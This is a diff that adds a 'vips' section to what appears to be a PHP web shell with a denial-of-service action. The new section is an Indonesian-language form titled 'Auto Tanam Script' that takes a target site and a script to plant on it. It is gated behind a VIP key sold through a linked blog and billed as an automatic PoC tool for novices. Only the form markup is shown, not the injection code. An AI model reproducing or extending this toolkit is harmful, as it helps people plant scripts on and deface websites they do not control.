@@ -3484,6 +3484,28 @@ $target=$_SERVER['DOCUMENT_ROOT'];
 ?>
 <br><br><hr width="300">
 <?php
+} elseif($_GET['do'] == 'vips') {
+?>
+	<center><br><table><td style='background-color: transparent;text-align:center;border: 2px blue 
+
+dotted;width:300px;height:250px;'><br> <table class="tabnet" style="width:333px;padding:0 1px;">
+<th colspan="5">Auto Tanam Script</th>
+<tr><tr><td>V Key</td><td>:</td>
+<td><input type="text" class="inputz" name="V5*****" size="8" maxlength="7"  value = "V5*****" onblur = "if ( this.value=='' ) this.value = 'V5*****';" onfocus = " if ( this.value == 'V5*****' ) this.value = '';"/>
+</td></tr>
+<tr><tr><td>Target</td><td>:</td>
+<td><input type="text" class="inputz" name="Masukkan situs target disini..!" size="48" maxlength="50"  value = "Masukkan situs target disini..!" onblur = "if ( this.value=='' ) this.value = 'Masukkan situs target disini..!';" onfocus = " if ( this.value == 'Masukkan situs target disini..!' ) this.value = '';"/>
+</td></tr>
+<tr><td>Script</td><td>:</td>
+<td><input type="text" class="inputz" name="Masukkan script Anda disini..." size="48" maxlength="5000"  value = "Masukkan script Anda disini..." onblur = "if ( this.value=='' ) this.value = 'Masukkan script Anda disini...';" onfocus = " if ( this.value == 'Masukkan script Anda disini...' ) this.value = '';"/>
+</td></tr></tr></table></b><br>
+<input type="submit" class="inputzbut" name="fire" value="  TANAM   ">
+<br>
+<br>
+<font color='gold'>Special tool untuk Noob dengan fungsi automatic Poc, Hanya VIP Members yang dapat menggunakan fitur ini, Kode akses VIP silakan klik <a href='https://alxwahid.blogspot.com' 
+
+target='_blank'>VIP.KEY</font><br></tr></td></table></center>
+<?php
 		} elseif($_GET['do'] == 'dos'){
 ?>
 <html>
